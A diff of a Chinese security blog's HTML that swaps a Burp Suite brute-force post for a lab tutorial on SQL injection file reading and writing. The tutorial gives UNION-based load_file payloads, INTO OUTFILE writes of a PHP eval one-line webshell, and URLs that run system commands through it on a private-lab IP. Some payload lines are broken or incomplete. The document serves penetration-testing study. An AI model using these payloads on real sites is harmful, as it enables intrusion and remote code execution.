@@ -25,23 +25,20 @@
     var CONFIG = {"hostname":"chengstery.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="爆破 在我们之前的登录页面中，因为没有设置登录失败的次数限制，所以可以通过Burp爆破的方式进行登录，从而获取到登录的用户名和密码，进而登录到系统中。  基于Baidu-OCR的验证码识别使用插件captcha-killer Attack type的四种爆破类型第一种：sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload">
+  <meta name="description" content="前言 因为我们不知道可写文件夹和可写路径，所以这个漏洞能利用的可能性很小。这是在我们自己搭建的环境中测试这个漏洞，我们先确定文件的读写权限，然后再进行文件读写。真实环境中，我们需要爆破出可读写的文件路径。  一  读写权限确认 为了实现这个漏洞的利用，我们需要先确认文件的读写权限，然后再进行文件读写（真实情况我们是做不了这一步的，这是为了确定是否有这个漏洞）。  12345show global">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入-登录漏洞-Burp爆破">
-<meta property="og:url" content="https://chengstery.top/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-Burp%E7%88%86%E7%A0%B4/index.html">
+<meta property="og:title" content="SQL注入-文件读写及木马植入">
+<meta property="og:url" content="https://chengstery.top/2023/12/06/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%8F%8A%E6%9C%A8%E9%A9%AC%E6%A4%8D%E5%85%A5/index.html">
 <meta property="og:site_name" content="chengstery">
-<meta property="og:description" content="爆破 在我们之前的登录页面中，因为没有设置登录失败的次数限制，所以可以通过Burp爆破的方式进行登录，从而获取到登录的用户名和密码，进而登录到系统中。  基于Baidu-OCR的验证码识别使用插件captcha-killer Attack type的四种爆破类型第一种：sniper标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload">
+<meta property="og:description" content="前言 因为我们不知道可写文件夹和可写路径，所以这个漏洞能利用的可能性很小。这是在我们自己搭建的环境中测试这个漏洞，我们先确定文件的读写权限，然后再进行文件读写。真实环境中，我们需要爆破出可读写的文件路径。  一  读写权限确认 为了实现这个漏洞的利用，我们需要先确认文件的读写权限，然后再进行文件读写（真实情况我们是做不了这一步的，这是为了确定是否有这个漏洞）。  12345show global">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://chengstery.top/images/baopo3.png">
-<meta property="og:image" content="https://chengstery.top/images/baopo4.png">
-<meta property="article:published_time" content="2023-12-04T14:59:12.579Z">
-<meta property="article:modified_time" content="2023-12-04T15:09:30.144Z">
+<meta property="article:published_time" content="2023-12-06T04:19:07.121Z">
+<meta property="article:modified_time" content="2023-12-06T04:19:00.020Z">
 <meta property="article:author" content="stery">
 <meta property="article:tag" content="coding">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://chengstery.top/images/baopo3.png">
 
-<link rel="canonical" href="https://chengstery.top/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-Burp%E7%88%86%E7%A0%B4/">
+<link rel="canonical" href="https://chengstery.top/2023/12/06/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%8F%8A%E6%9C%A8%E9%A9%AC%E6%A4%8D%E5%85%A5/">
 
 
 <script id="page-configurations">
@@ -54,7 +51,7 @@
   };
 </script>
 
-  <title>SQL注入-登录漏洞-Burp爆破 | chengstery</title>
+  <title>SQL注入-文件读写及木马植入 | chengstery</title>
   
 
 
@@ -180,7 +177,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chengstery.top/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-Burp%E7%88%86%E7%A0%B4/">
+    <link itemprop="mainEntityOfPage" href="https://chengstery.top/2023/12/06/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%8F%8A%E6%9C%A8%E9%A9%AC%E6%A4%8D%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -193,7 +190,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SQL注入-登录漏洞-Burp爆破
+          SQL注入-文件读写及木马植入
         </h1>
 
         <div class="post-meta">
@@ -206,7 +203,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-12-04 22:59:12 / 修改时间：23:09:30" itemprop="dateCreated datePublished" datetime="2023-12-04T22:59:12+08:00">2023-12-04</time>
+              <time title="创建时间：2023-12-06 12:19:07 / 修改时间：12:19:00" itemprop="dateCreated datePublished" datetime="2023-12-06T12:19:07+08:00">2023-12-06</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -224,7 +221,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>996</span>
+              <span>1.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -243,18 +240,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><blockquote>
-<p>在我们之前的<a href="https://chengstery.top/2023/12/02/%E5%AD%A6%E4%B9%A0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9A%84%E5%AD%A6%E5%89%8D%E5%87%86%E5%A4%87-4/">登录页面</a>中，因为没有设置登录失败的次数限制，所以可以通过Burp爆破的方式进行登录，从而获取到登录的用户名和密码，进而登录到系统中。</p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>因为我们不知道可写文件夹和可写路径，所以这个漏洞能利用的可能性很小。这是在我们自己搭建的环境中测试这个漏洞，我们先确定文件的读写权限，然后再进行文件读写。<br>真实环境中，我们需要爆破出<strong>可读写</strong>的文件路径。</p>
 </blockquote>
-<h2 id="基于Baidu-OCR的验证码识别"><a href="#基于Baidu-OCR的验证码识别" class="headerlink" title="基于Baidu-OCR的验证码识别"></a>基于Baidu-OCR的验证码识别</h2><p><strong><em>使用插件captcha-killer</em></strong><br><img src="/../images/baopo3.png" alt="爆破"></p>
-<h2 id="Attack-type的四种爆破类型"><a href="#Attack-type的四种爆破类型" class="headerlink" title="Attack type的四种爆破类型"></a>Attack type的四种爆破类型</h2><p><strong><em>第一种：</em></strong><br><strong>sniper</strong>标签 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
-<p><strong><em>第二种：</em></strong><br><strong>Battering ram</strong> - 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个p1ayload字典同时应用到多个position中</p>
-<p><strong><em>第三种：</em></strong><br><strong>Pitchfork</strong> - 这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量</p>
-<p><strong><em>第四种：</em></strong><br><strong>cluster bomb</strong> - 这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。</p>
-<h2 id="Resource-Pool-资源池（并发线程设置）"><a href="#Resource-Pool-资源池（并发线程设置）" class="headerlink" title="Resource Pool  资源池（并发线程设置）"></a>Resource Pool  资源池（并发线程设置）</h2><p>需要设置单线程，无法控制captcha-killer的多线程逻辑(效率过低，可用Python的多进程)<br><img src="/../images/baopo4.png" alt="爆破"></p>
-<blockquote>
-<p>完整代码见<a target="_blank" rel="noopener" href="https://github.com/chengstery/security/tree/main/linux_login">https://github.com/chengstery/security/tree/main/linux_login</a></p>
+<h1 id="一-读写权限确认"><a href="#一-读写权限确认" class="headerlink" title="一  读写权限确认"></a>一  读写权限确认</h1><blockquote>
+<p>为了实现这个漏洞的利用，我们需要先确认文件的读写权限，然后再进行文件读写（真实情况我们是做不了这一步的，这是为了确定是否有这个漏洞）。</p>
 </blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br><span class="line">查看mysql全局变量配置，当输入以上命令后，结果</span><br><span class="line">secure_file_priv <span class="operator">=</span> 空        <span class="comment">--&gt; 任意读写</span></span><br><span class="line">secure_file_priv <span class="operator">=</span> 某个路径   <span class="comment">--&gt; 规定路径下读写</span></span><br><span class="line">secure_file_priv <span class="operator">=</span> <span class="keyword">NULL</span>      <span class="comment">--&gt; 不能读写</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="二-读文件"><a href="#二-读文件" class="headerlink" title="二  读文件"></a>二  读文件</h1><p>利用SQL语句读取系统文件，先读取常规文件（明确路径），先爆破路径再爆破路径下文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,load_file(<span class="string">&#x27;C/windows/service.inf&#x27;</span>),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line">,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,load_file(<span class="string">&#x27;D/XamppNew/htdocs/scurity/common.php&#x27;</span>),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br><span class="line">或</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.88</span><span class="number">.130</span><span class="operator">/</span>security<span class="operator">/</span>read.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,(<span class="keyword">select</span> load_file(&quot;/opt/lampp/htdocs/security/common.php&quot;)),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="三-写文件"><a href="#三-写文件" class="headerlink" title="三  写文件"></a>三  写文件</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,&quot;&lt;?php phpinfo(); ?&gt;&quot; <span class="keyword">into</span> </span><br><span class="line">outfile <span class="string">&#x27;D/XamppNew/htdocs/scurity/muma.php&#x27;</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.88</span><span class="number">.130</span><span class="operator">/</span>security<span class="operator">/</span>read.php?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,&quot;HelloWorld&quot;,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">into</span> outfile &quot;/opt/lampp/htdocs/security/temp/muma.php&quot;</span><br><span class="line"></span><br><span class="line"># 尝试得到列数量，然后注入一次，访问是否注入成功</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> unionselect1，<span class="number">2</span>，<span class="number">3</span>，<span class="number">4</span>，<span class="number">5</span>，<span class="number">6</span>，&quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt; into</span><br><span class="line">outfile &#x27;D/XamppNew/htdocs/scurity/muma.php&#x27;</span><br><span class="line"></span><br><span class="line">一句话木马：</span><br><span class="line">&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">eval可以将一段字符串当成代码来执行，如果用户可以直接将这段有效代码传入后台，则可以执行任意命令</span><br><span class="line"></span><br><span class="line">http://192.168.88.130/security/temp/muma2.php?a=echo date(&quot;Y<span class="operator">-</span>m<span class="operator">-</span>d H:i:s&quot;);</span><br><span class="line">http://192.168.88.130/security/temp/muma2.php?a=phpinfo();</span><br><span class="line">http://192.168.88.130/security/temp/muma2.php?a=system(&#x27;ip addr&#x27;);</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -280,7 +277,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://chengstery.top/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-Burp%E7%88%86%E7%A0%B4/" title="SQL注入-登录漏洞-Burp爆破">https://chengstery.top/2023/12/04/SQL注入-登录漏洞-Burp爆破/</a>
+    <a href="https://chengstery.top/2023/12/06/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%8F%8A%E6%9C%A8%E9%A9%AC%E6%A4%8D%E5%85%A5/" title="SQL注入-文件读写及木马植入">https://chengstery.top/2023/12/06/SQL注入-文件读写及木马植入/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -326,13 +323,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4/" rel="prev" title="SQL注入-登录漏洞-SQL注入防护">
-      <i class="fa fa-chevron-left"></i> SQL注入-登录漏洞-SQL注入防护
+    <a href="/2023/12/05/SQL%E6%B3%A8%E5%85%A5-SQLMap%E5%B7%A5%E5%85%B7/" rel="prev" title="SQL注入-SQLMap工具">
+      <i class="fa fa-chevron-left"></i> SQL注入-SQLMap工具
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/12/04/SQL%E6%B3%A8%E5%85%A5-%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E-%E7%99%BB%E5%BD%95%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/" rel="next" title="SQL注入-登录漏洞-登录次数限制">
-      SQL注入-登录漏洞-登录次数限制 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -396,7 +390,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">1.</span> <span class="nav-text">爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8EBaidu-OCR%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB"><span class="nav-number">2.</span> <span class="nav-text">基于Baidu-OCR的验证码识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-type%E7%9A%84%E5%9B%9B%E7%A7%8D%E7%88%86%E7%A0%B4%E7%B1%BB%E5%9E%8B"><span class="nav-number">3.</span> <span class="nav-text">Attack type的四种爆破类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Resource-Pool-%E8%B5%84%E6%BA%90%E6%B1%A0%EF%BC%88%E5%B9%B6%E5%8F%91%E7%BA%BF%E7%A8%8B%E8%AE%BE%E7%BD%AE%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">Resource Pool  资源池（并发线程设置）</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80-%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90%E7%A1%AE%E8%AE%A4"><span class="nav-number">2.</span> <span class="nav-text">一  读写权限确认</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C-%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">二  读文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89-%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-number">4.</span> <span class="nav-text">三  写文件</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
